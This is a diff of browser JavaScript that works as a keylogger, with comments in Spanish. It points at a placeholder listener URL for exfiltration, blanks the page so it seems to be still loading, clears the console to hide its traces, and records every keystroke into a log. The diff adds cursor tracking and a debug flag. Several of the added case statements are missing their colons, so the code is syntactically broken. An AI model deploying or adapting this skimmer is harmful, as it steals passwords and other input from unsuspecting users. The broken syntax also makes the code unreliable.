@@ -1,7 +1,13 @@
 //Esto lo dejo así para cambiarlo por consola
 var https_listener_for_logging = 'https://listener.changeme'
+//String que representa el texto a capturar
 var log = ''
+//Representación del cursor
+cursor = 0
+//Teclas que, si se capturan, se van a ignorar
 var ignoredKeys = ['Shift', 'CapsLock', 'Tab', 'Control', 'Alt']
+//Flag de depuracion
+debug = false
 document.addEventListener('DOMContentLoaded', function () {
     // Borramos el contenido para que parezca que sigue cargando
     document.body.innerHTML = '';
@@ -30,10 +36,29 @@ document.addEventListener('DOMContentLoaded', function () {
             );
 
             window.addEventListener("keydown", function (e) {
-                if (e.key === 'Backspace')
-                    log = log.slice(0, -1)
-                else if (!ignoredKeys.includes(e.key))
-                    log = log + e.key
+                switch (e.key){
+                    case 'Backspace':
+                        log = log.slice(0, -1)
+                        cursor--
+                        break
+                    case ('ArrowLeft')
+                        cursor--
+                        break
+                    case ('ArrowRight')
+                        cursor++
+                        break
+                    case ('ArrowUp')
+                        cursor = 0
+                        break
+                    case ('ArrowDown')
+                        cursor = log.length - 1
+                        break
+                    default:
+                        if (!ignoredKeys.includes(e.key))
+                            log = log.substring(0, cursor) + e.key + log.substring(cursor)
+                }
+                if (debug)
+                    console.log('log: '+ log + 'cursor: ' + cursor)
             });
             console.clear();
         })
